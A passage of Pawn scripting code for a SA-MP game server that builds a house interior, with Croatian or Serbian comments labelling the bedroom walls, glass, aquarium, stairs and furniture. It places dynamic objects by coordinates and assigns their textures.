	VKUCAINTTAMNIZID[32] = CreateDynamicObject(19458, 1688.77588, 3841.54834, 9.99390,   0.00000, 90.00000, 90.00000);
	VKUCAINTTAMNIZID[33] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 7.87390,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[34] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 7.44990,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[35] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 7.02590,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[36] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 6.60190,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[37] = CreateDynamicObject(19458, 1682.43994, 3838.48218, 9.99390,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[38] = CreateDynamicObject(19458, 1682.43994, 3838.48218, 9.56990,   0.00000, 90.00000, -0.06000);
	VKUCAINTTAMNIZID[39] = CreateDynamicObject(19458, 1682.43994, 3838.48218, 9.14590,   0.00000, 90.00000, -0.06000);
	VKUCAINTTAMNIZID[40] = CreateDynamicObject(19458, 1682.43994, 3838.48218, 8.72190,   0.00000, 90.00000, -0.06000);
	VKUCAINTTAMNIZID[41] = CreateDynamicObject(19458, 1682.43994, 3838.48218, 8.29790,   0.00000, 90.00000, -0.06000);
	VKUCAINTTAMNIZID[42] = CreateDynamicObject(19458, 1682.43994, 3838.48218, 7.87390,   0.00000, 90.00000, -0.06000);
	VKUCAINTTAMNIZID[43] = CreateDynamicObject(19458, 1682.43994, 3838.48218, 7.44990,   0.00000, 90.00000, -0.06000);

	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[0],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[1],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[2],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[3],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[4],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[5],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[6],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[7],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCAINTTAMNIZID[8],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[9],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[10],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[11],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[12],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[13],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[14],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[15],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[16],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[17],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[18],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[19],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[20],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[21],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[22],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[23],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[24],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[25],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[26],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[27],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[28],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[29],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[30],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[31],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[32],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[33],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[34],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[35],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[36],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[37],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[38],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[39],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[40],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[41],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[42],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTTAMNIZID[43],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);

	//zidovi spavace sobe
	new VKUCAINTSPAVACA[8];
	VKUCAINTSPAVACA[0] = CreateDynamicObject(19375, 1678.16736, 3843.27246, 5.58920,   0.00000, 0.00000, 90.00000);
	VKUCAINTSPAVACA[1] = CreateDynamicObject(19375, 1679.89795, 3852.41919, 5.58920,   0.00000, 0.00000, 0.00000);
	VKUCAINTSPAVACA[2] = CreateDynamicObject(19375, 1683.02075, 3840.55591, 5.58920,   0.00000, 0.00000, 0.00000);
	VKUCAINTSPAVACA[3] = CreateDynamicObject(19375, 1676.40222, 3851.53296, 5.58920,   0.00000, 0.00000, 90.00000);
	VKUCAINTSPAVACA[4] = CreateDynamicObject(19375, 1672.04846, 3846.77466, 5.58920,   0.00000, 0.00000, 0.00000);
	VKUCAINTSPAVACA[5] = CreateDynamicObject(19375, 1668.53357, 3843.27246, 5.58920,   0.00000, 0.00000, 90.00000);
	VKUCAINTSPAVACA[6] = CreateDynamicObject(19429, 1680.61365, 3847.68481, 8.75032,   0.00000, 0.00000, 90.00000);
	VKUCAINTSPAVACA[7] = CreateDynamicObject(19429, 1682.21729, 3847.68481, 8.75030,   0.00000, 0.00000, 90.00000);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[0],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[1],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[2],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[3],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[4],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[5],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[6],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);
	SetDynamicObjectMaterial(VKUCAINTSPAVACA[7],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFE6F4B0);

	//stakloidi
	new VKUCAINTSTAKLA[12];
 	VKUCAINTSTAKLA[0] = CreateDynamicObject(19325,1706.1168, 3839.8733, 8.0741,0.0000, 0.0000, 0.0000);
	VKUCAINTSTAKLA[1] = CreateDynamicObject(19325,1706.1168, 3846.5149, 8.0841,0.0000, 0.0000, 0.0000);
	VKUCAINTSTAKLA[2] = CreateDynamicObject(19325,1706.1168, 3860.2090, 8.0801,0.0000, 0.0000, 0.0000);
	VKUCAINTSTAKLA[3] = CreateDynamicObject(19466,1683.1447, 3844.7305, 9.1459,0.0000, 0.0000, 0.0000);
	VKUCAINTSTAKLA[4] = CreateDynamicObject(19466,1683.1447, 3844.7305, 7.2091,0.0000, 0.0000, 0.0000);
	VKUCAINTSTAKLA[5] = CreateDynamicObject(19466,1688.8033, 3847.7178, 9.1459,0.0000, 0.0000, 90.0000);
	VKUCAINTSTAKLA[6] = CreateDynamicObject(19466,1688.8033, 3847.7178, 7.2091,0.0000, 0.0000, 90.0000);
	//akvarij
	VKUCAINTSTAKLA[7] = CreateDynamicObject(19466, 1694.99207, 3848.88086, 8.22240,   0.00000, 0.00000, 0.00000);
	VKUCAINTSTAKLA[8] = CreateDynamicObject(19466, 1694.99207, 3851.11987, 8.22240,   0.00000, 0.00000, 0.00000);
	VKUCAINTSTAKLA[9] = CreateDynamicObject(19466, 1694.99207, 3853.35791, 8.22240,   0.00000, 0.00000, 0.00000);
	VKUCAINTSTAKLA[10] = CreateDynamicObject(19466, 1694.99207, 3855.59692, 8.22240,   0.00000, 0.00000, 0.00000);
	VKUCAINTSTAKLA[11] = CreateDynamicObject(19466, 1693.87415, 3847.76099, 8.22240,   0.00000, 0.00000, 90.00000);

    SetDynamicObjectMaterial(VKUCAINTSTAKLA[0],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF000000);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[1],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF000000);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[2],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF000000);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[3],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF000000);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[4],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF000000);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[5],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF000000);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[6],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF000000);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[7],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF06AEFF);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[8],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF06AEFF);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[9],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF06AEFF);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[10],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF06AEFF);
    SetDynamicObjectMaterial(VKUCAINTSTAKLA[11],0, 19325, "lsmall_shops", "lsmall_window01", 0xFF06AEFF);

	new VKUCAINTSTEPENICE[4];
	VKUCAINTSTEPENICE[0] = CreateDynamicObject(18763, 1687.58667, 3844.11426, 4.37410,   0.00000, 0.00000, 0.00000);
	VKUCAINTSTEPENICE[1] = CreateDynamicObject(18981, 1673.59143, 3835.37183, 6.37370,   0.00000, 90.00000, 0.00000);
	VKUCAINTSTEPENICE[2] = CreateDynamicObject(18981, 1673.86340, 3835.37183, 6.20570,   0.00000, 90.00000, 0.00000);
	VKUCAINTSTEPENICE[3] = CreateDynamicObject(18763, 1687.86267, 3844.35449, 4.20410,   0.00000, 0.00000, -0.06000);
    SetDynamicObjectMaterial(VKUCAINTSTEPENICE[0],0, 8399, "vgs_shops", "vgsclubwall05_128", 0xFF8B8B8B);
    SetDynamicObjectMaterial(VKUCAINTSTEPENICE[1],0, 8399, "vgs_shops", "vgsclubwall05_128", 0xFF8B8B8B);
    SetDynamicObjectMaterial(VKUCAINTSTEPENICE[2],0, 8399, "vgs_shops", "vgsclubwall05_128", 0xFFB0B0B0);
    SetDynamicObjectMaterial(VKUCAINTSTEPENICE[3],0, 8399, "vgs_shops", "vgsclubwall05_128", 0xFFB0B0B0);

	new VKUCASTALAZA[10];
	VKUCASTALAZA[0] = CreateDynamicObject(19358, 1681.34656, 3841.90479, 7.43880,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[1] = CreateDynamicObject(19358, 1678.93860, 3841.90479, 7.43680,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[2] = CreateDynamicObject(19358, 1678.93860, 3841.90479, 8.22080,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[3] = CreateDynamicObject(19358, 1678.93860, 3841.90479, 9.02880,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[4] = CreateDynamicObject(19358, 1678.93860, 3841.90479, 9.77880,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[5] = CreateDynamicObject(19358, 1681.34656, 3841.90479, 8.22280,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[6] = CreateDynamicObject(19358, 1681.34656, 3841.90479, 9.03080,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[7] = CreateDynamicObject(19358, 1681.34656, 3841.90479, 9.78080,   0.00000, 90.00000, 90.00000);
	VKUCASTALAZA[8] = CreateDynamicObject(19358, 1677.88464, 3841.83691, 8.49080,   0.00000, 0.00000, 0.00000);
	VKUCASTALAZA[9] = CreateDynamicObject(19358, 1682.27063, 3841.83691, 8.49080,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(VKUCASTALAZA[0],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[1],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[2],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[3],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[4],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[5],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[6],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[7],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[8],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCASTALAZA[9],0, 12954, "sw_furniture", "CJ_WOOD5", 0xFFFFFFFF);

	new VKUCAINTOGLEDALO[3];
	VKUCAINTOGLEDALO[0] = CreateDynamicObject(2255, 1679.30823, 3850.33740, 8.60580,   0.00000, 0.00000, -90.00000);
	VKUCAINTOGLEDALO[1] = CreateDynamicObject(2255, 1679.30823, 3849.49561, 8.60580,   0.00000, 0.00000, -90.00000);
	VKUCAINTOGLEDALO[2] = CreateDynamicObject(2255, 1679.30823, 3848.65381, 8.60580,   0.00000, 0.00000, -90.00000);
	SetDynamicObjectMaterial(VKUCAINTOGLEDALO[0],0, 14581, "ab_mafiasuitea", "barbersmir1", 0x00000000);
	SetDynamicObjectMaterial(VKUCAINTOGLEDALO[1],0, 14581, "ab_mafiasuitea", "barbersmir1", 0x00000000);
	SetDynamicObjectMaterial(VKUCAINTOGLEDALO[2],0, 14581, "ab_mafiasuitea", "barbersmir1", 0x00000000);


	new VKUCALAJNE[8];
	//kod prozora
	VKUCALAJNE[0] = CreateDynamicObject(19089,1706.1172, 3843.5129, 10.5307,0.0000, 0.0000, 0.0000);
	VKUCALAJNE[1] = CreateDynamicObject(19089,1706.1172, 3846.9211, 10.5307,0.0000, 0.0000, 0.0000);
	//ostale od dekoracije
	VKUCALAJNE[2] = CreateDynamicObject(19087, 1694.83594, 3843.26660, 10.03010,   0.00000, 0.00000, 0.00000);
	VKUCALAJNE[3] = CreateDynamicObject(19087, 1694.83594, 3843.26660, 7.58610,   0.00000, 0.00000, 0.00000);
	VKUCALAJNE[4] = CreateDynamicObject(19087, 1689.11084, 3843.27954, 9.90810,   0.00000, 0.00000, 0.00000);
	VKUCALAJNE[5] = CreateDynamicObject(19087, 1689.11084, 3843.27954, 7.43910,   0.00000, 0.00000, 0.00000);
	VKUCALAJNE[6] = CreateDynamicObject(19087, 1684.21375, 3843.27954, 9.90810,   0.00000, 0.00000, 0.00000);
	VKUCALAJNE[7] = CreateDynamicObject(19087, 1684.21375, 3843.27954, 7.43910,   0.00000, 0.00000, 0.00000);

	SetDynamicObjectMaterial(VKUCALAJNE[0],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
	SetDynamicObjectMaterial(VKUCALAJNE[1],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
	SetDynamicObjectMaterial(VKUCALAJNE[2],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCALAJNE[3],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCALAJNE[4],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCALAJNE[5],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCALAJNE[6],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	SetDynamicObjectMaterial(VKUCALAJNE[7],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);

	new VKUCASAKSIJA[2];
	VKUCASAKSIJA[0] = CreateDynamicObject(948, 1684.67419, 3843.52637, 7.07260,   0.00000, 0.00000, 0.00000);
	VKUCASAKSIJA[1] = CreateDynamicObject(948, 1688.50916, 3843.52637, 7.07260,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(VKUCASAKSIJA[0],3, 2361, "shopping_freezers", "white", 0xFF804040);
	SetDynamicObjectMaterial(VKUCASAKSIJA[1],3, 2361, "shopping_freezers", "white", 0xFF804040);

	new VKUCAPROZORCIC[8];
	VKUCAPROZORCIC[0] = CreateDynamicObject(2260, 1672.69446, 3845.66284, 8.29620,   0.00000, 0.00000, 90.00000);
	VKUCAPROZORCIC[1] = CreateDynamicObject(2260, 1672.69446, 3844.96289, 8.29620,   0.00000, 0.00000, 90.00000);
	VKUCAPROZORCIC[2] = CreateDynamicObject(2260, 1672.69238, 3844.96289, 8.74420,   0.00000, 0.00000, 90.00000);
	VKUCAPROZORCIC[3] = CreateDynamicObject(2260, 1672.69250, 3845.66284, 8.74420,   0.00000, 0.00000, 90.00000);
	VKUCAPROZORCIC[4] = CreateDynamicObject(2260, 1672.69250, 3848.93872, 8.74420,   0.00000, 0.00000, 90.00000);
	VKUCAPROZORCIC[5] = CreateDynamicObject(2260, 1672.69250, 3849.64087, 8.74420,   0.00000, 0.00000, 90.00000);
	VKUCAPROZORCIC[6] = CreateDynamicObject(2260, 1672.69055, 3849.64087, 8.27620,   0.00000, 0.00000, 90.00000);
	VKUCAPROZORCIC[7] = CreateDynamicObject(2260, 1672.69055, 3848.93872, 8.27620,   0.00000, 0.00000, 90.00000);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[0],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[0],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[1],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[1],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[2],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[2],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[3],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[3],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[4],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[4],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[5],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[5],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[6],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[6],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[7],0, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);
	SetDynamicObjectMaterial(VKUCAPROZORCIC[7],1, 18031, "cj_exp", "mp_cloth_wall", 0xFF838383);

	new VKUCAWCOBJ1 = CreateDynamicObject(2018, 1692.41394, 3851.37476, 6.39350,   0.00000, 0.00000, -90.00000);
    SetDynamicObjectMaterial(VKUCAWCOBJ1,0,2018,"mrk_kitstuf","la_kitch1",0xFFFFFFFF);
	new VKUCAWCOBJ2 = CreateDynamicObject(2015, 1692.41394, 3848.39966, 6.39350,   0.00000, 0.00000, -89.94000);
	SetDynamicObjectMaterial(VKUCAWCOBJ2,0,2015,"mrk_kitstuf","la_kitch1",0xFFFFFFFF);

	new VKUCAWCOBJ3 = CreateDynamicObject(2014, 1692.41394, 3849.38965, 6.39350,   0.00000, 0.00000, -89.94000);
	SetDynamicObjectMaterial(VKUCAWCOBJ3,0,2014,"mrk_kitstuf","la_kitch1",0xFFFFFFFF);
	new VKUCAWCOBJ4 = CreateDynamicObject(2014, 1692.41394, 3850.37964, 6.39350,   0.00000, 0.00000, -89.94000);
	SetDynamicObjectMaterial(VKUCAWCOBJ4,0,2014,"mrk_kitstuf","la_kitch1",0xFFFFFFFF);
	new VKUCAWCOBJ5 = CreateDynamicObject(2014, 1692.41394, 3852.37451, 6.39350,   0.00000, 0.00000, -89.94000);
	SetDynamicObjectMaterial(VKUCAWCOBJ5,0,2014,"mrk_kitstuf","la_kitch1",0xFFFFFFFF);
	new VKUCAWCOBJ6 = CreateDynamicObject(2016, 1692.41394, 3853.36450, 6.39350,   0.00000, 0.00000, -89.94000);
    SetDynamicObjectMaterial(VKUCAWCOBJ6,0,2016,"mrk_kitstuf","la_kitch1",0xFFFFFFFF);

	//ostaloo
	CreateDynamicObject(19540, 1706.03149, 3963.11255, 6.17340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19540, 1706.03149, 3838.11792, 6.17340,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(19542, 1706.02600, 3900.58887, 6.17338,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19542, 1643.53394, 3838.16089, 6.17340,   0.00000, 0.00000, 270.00000);
	new VKUCAVRATA1 = CreateDynamicObject(1569, 1688.10071, 3843.22974, 7.06700,   0.00000, 0.00000, 180.00000);
	SetDynamicObjectMaterial(VKUCAVRATA1, 0, 4829, "airport_las", "liftdoorsac256", 0xFFFFFFFF);

	new VKUCAVRATA2 = CreateDynamicObject(1569, 1685.09985, 3843.22974, 7.06700,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(VKUCAVRATA2, 0, 4829, "airport_las", "liftdoorsac256", 0xFFFFFFFF);
	new VKUCAKREVET = CreateDynamicObject(2565, 1673.42773, 3848.94580, 7.62870,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(VKUCAKREVET,0,2565,"cj_hotel_sw","nt_phone1",0xFFFFFFFF);
	CreateDynamicObject(14740, 1672.27356, 3849.31641, 9.15200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14752, 1672.50378, 3849.41064, 9.04260,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19786, 1675.52625, 3843.29712, 8.77720,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2229, 1676.76245, 3843.06665, 6.65160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2229, 1673.62646, 3843.06665, 6.65160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2313, 1676.20215, 3843.44141, 7.07110,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2028, 1675.49866, 3843.63452, 7.62420,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2267, 1675.93616, 3851.42310, 9.29610,   0.00000, 0.00000, 0.00000);
	new VKUCASW = CreateDynamicObject(2562, 1679.30945, 3850.97607, 7.05660,   0.00000, 0.00000, -90.00000);
	SetDynamicObjectMaterial(VKUCASW,1,2562,"cj_hotel_sw","CJ_WOOD1",0xFFFFFFFF);
	CreateDynamicObject(1738, 1682.72485, 3844.73145, 7.63740,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2069, 1672.53577, 3843.57739, 7.11160,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1731, 1672.66455, 3847.40039, 9.00910,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1734, 1675.97424, 3846.53125, 10.12530,   0.00000, 0.00000, -0.06000);
	CreateDynamicObject(14752, 1672.50378, 3845.43555, 9.04260,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2139, 1687.37476, 3856.48364, 6.39330,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2136, 1687.34985, 3853.54688, 6.39330,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2136, 1687.35193, 3851.58569, 6.39530,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2139, 1687.37683, 3855.50562, 6.39530,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2139, 1687.37683, 3850.60400, 6.39530,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18001, 1686.91858, 3853.00488, 9.03360,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18001, 1686.91858, 3853.00488, 7.60560,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2139, 1687.37683, 3849.61792, 6.39530,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2707, 1687.10095, 3849.85303, 9.63480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2707, 1687.10095, 3851.01294, 9.63480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2707, 1687.10095, 3852.17310, 9.63480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2707, 1687.10095, 3853.56494, 9.63480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2707, 1687.10095, 3854.95679, 9.63480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2707, 1687.10095, 3856.11719, 9.63480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2528, 1689.22668, 3856.69580, 6.39250,   0.00000, 0.00000, 0.00000);
